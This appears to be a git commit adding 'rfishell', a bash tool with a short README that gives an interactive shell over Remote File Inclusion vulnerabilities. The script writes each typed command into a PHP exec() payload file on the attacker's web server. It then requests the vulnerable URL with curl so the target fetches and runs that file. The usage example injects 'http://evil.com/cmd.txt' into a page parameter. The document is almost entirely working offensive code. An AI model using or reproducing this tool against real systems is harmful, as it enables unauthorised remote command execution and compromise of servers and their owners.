8aea7827cf051ef0e53b349d8568fde68b1aff88
superkojiman <superkojiman@techorganic.com>
2014-09-05 17:21:12 -0400

    Initial import.

--- README.md
+++ README.md
@@ -1,2 +1,4 @@
 rfishell
 ========
+
+Provide a shell-like interface when exploiting Remote File Inclusion vulnerabilities. For more details, see [http://blog.techorganic.com/2012/06/26/lets-kick-shell-ish-part-2-remote-file-inclusion-shell/](http://blog.techorganic.com/2012/06/26/lets-kick-shell-ish-part-2-remote-file-inclusion-shell/)
---
+++ rfishell.sh
@@ -0,0 +1,52 @@
+#!/bin/bash
+
+function rfi_template {
+	echo "<pre><?php echo exec("$1");?></pre>" > $2
+}
+
+function usage {
+	echo "usage: $0 [-f cmd.txt] -u URL"
+	echo "eg   : $0 -f /var/www/hack.txt  -u \"http://vulnsite.com/test.php?page=http://evil.com/cmd.txt\""
+}
+
+if [[ -z $1 ]]; then 
+	usage
+	exit 0;
+fi
+
+prefix=""
+suffix=""
+url=""
+cmdfile=""
+rfifile=""
+
+while getopts "u:f:" OPT; do 
+	case $OPT in
+		u) url=$OPTARG;;
+		f) rfifile=$OPTARG;;
+		*) usage; exit 0;;
+	esac
+done
+
+if [[ -z $url ]]; then
+	usage
+	exit 0;
+fi
+
+which curl &>/dev/null
+if [[ $? -ne 0 ]]; then
+	echo "[!] curl needs to be installed to run this script"
+	exit 1
+fi
+
+if [[ ! -z $rfifile ]]; then 
+	# use RFI to execute commands
+	while :; do 
+		printf "[rfi>] "
+		read cmd
+		rfi_template $cmd $rfifile
+		echo "[+] requesting ${url}${prefix}${suffix}"
+		curl "${url}${prefix}${suffix}"
+		echo ""
+	done
+fi
